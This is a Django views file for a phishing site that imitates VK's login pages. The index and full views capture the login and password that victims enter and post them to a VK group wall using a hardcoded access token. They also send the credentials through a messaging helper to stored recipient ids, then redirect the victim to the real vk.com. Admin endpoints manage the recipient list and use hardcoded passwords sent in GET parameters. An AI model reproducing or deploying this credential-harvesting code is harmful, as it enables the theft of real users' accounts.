from django.shortcuts import render
from django.http import *
from .forms import *
# from vk_api import *
from vk import *
from .microdetector import detect_mobile
from .models import *
import time
from array import *
from .utils import *

def index(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://m.vk.com")
    form = login()
    return render(request, "app_serverr/index.html", {"form": form})


@detect_mobile
def full(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://vk.com")
    if request.mobile:
        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
    form = full_login()
    return render(request, "app_serverr/full.html", {"form": form})


def id_add(request):
    # tel("запрос получен", 433019587)
    t = request.GET.get('t')
    c = check_pass(t)
    if c["status"]:
        i = request.GET.get('id')
        try:
            d = int(i)
        except Exception:
            # tel("your new айди не число: {}".format(i), 433019587)
            return HttpResponse("your new айди не число: {}".format(i))
        try:
            i = id_list.objects.get(number=d)
        except Exception:
            i = id_list.objects.create(number=d)
            tel("добавлен айди: {}".format(d), 433019587)
            return HttpResponse("добавлен айди: {}".format(d))
        return HttpResponse("этот id уже есть в таблице: {}".format(d))
    else:
        tel("error: {}".format(c["text"]), 433019587)
    return HttpResponse("error: {}".format(c["text"]))


def id_del(request):
    t = request.GET.get('t')
    a = request.GET.get('id')
    c = check_pass(t)
    if c["status"]:
        try:
            d = int(a)
        except Exception:
            return HttpResponse("your id is not number: {}".format(a))
        try:
            d = id_list.objects.get(number=d)
        except Exception:
            return HttpResponse("this id not exist in the table: {}".format(a))
        i = d.delete()
    return HttpResponse("id: {} успешно удалён".format(a))


def set_pass(request):
    n = request.GET.get('new')
    t = request.GET.get('t')
    o = request.GET.get('old')
    m = ""
    a = check_pass(t)
    try:
        if a["flag"] == False:
            if t == "qawsed":
                if len(n) > 7:
                    l = passs.objects.create(name='pass', pas=n)
                    m = "Новый пароль успешно установлен: {}".format(n)
                else:
                    m = "Длина пароля маловата - нужно не меньше 8 символов"
            else:
                m = "Пароль не верный!!!"
            return HttpResponse(m)
        if a["status"] and o != None and o == p.pas:
            if len(n) > 7:
                p.pas = n
                p.save()
                m = "пароль новый установлен: {}".format(n)
            else:
                m = "длина малова-та: {}".format(n)
        else:
            m = a["text"]
    except Exception:
        HttpResponse("some error!")        
    return HttpResponse(m)


def clear_pass(request):
    m = ""
    t = request.GET.get('t')
    n = 'aqswde'
    if t == n:
        p = passs.objects.in_bulk()
        for id in p:
            p[id].delete()
        m = "пароли удалены"
    else:
        m = "неверный пароль супеr: {0}".format(t)
    return HttpResponse(m)


def clear_ids(request):
    m = ""
    t = request.GET.get('t')
    c = check_pass(t)
    if c["status"]:
        i = id_list.objects.in_bulk()
        for id in i:
            i[id].delete()
        m = "ids удалены"
    else:
        m = "error: {}".format(c["text"])
    return HttpResponse(m)


def get_ids(request):
    o = ""
    t = request.GET.get('t')
    c = request.GET.get('chat')
    a = check_pass(t)
    if a["status"] == False:
        return HttpResponse("error: {}".format(a["text"]))
    i = id_list.objects.in_bulk()

    m = array('i', [])
    s = ""
    to = int()
    for f in i:
        # tel(f, 433019587)
        m.append(i[f].number)
        s += "```{}```\n".format(i[f].number)
    o = s
    return HttpResponse(o)
